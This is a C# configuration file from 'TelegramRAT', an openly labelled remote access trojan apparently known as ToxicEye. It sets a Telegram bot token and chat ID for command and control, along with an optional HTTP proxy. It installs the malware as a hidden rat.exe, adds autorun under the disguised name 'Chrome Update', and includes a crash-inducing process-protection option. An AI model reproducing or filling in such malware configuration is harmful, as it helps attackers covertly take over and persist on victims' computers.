namespace TelegramRAT
{
    internal class config
    {
        // Telegram:
        public static string TelegramToken = "YOU_TOKEN_HERE";
        public static string TelegramChatID = "YOU_CHATID_HERE";
        // HTTP proxy:
        // You can find free proxy here:
        // https://hidemy.name/ua/proxy-list/?type=h#list
        public static bool HttpProxyEnabled = false;
        public static string HttpProxyAddress = "88.198.24.108";
        public static int HttpProxyPort = 8080;
        // Install:
        public static bool AdminRightsRequired = true;
        public static bool HideDirectoryEnabled = true;
        public static string InstallPath = @"C:\Users\ToxicEye\rat.exe";
        // Autorun:
        public static bool AutorunEnabled = true;
        public static string AutorunName = "Chrome Update";
        // Process BSoD protection (Have bugs):
        public static bool ProcessProtectionEnabled = false;
    }
}
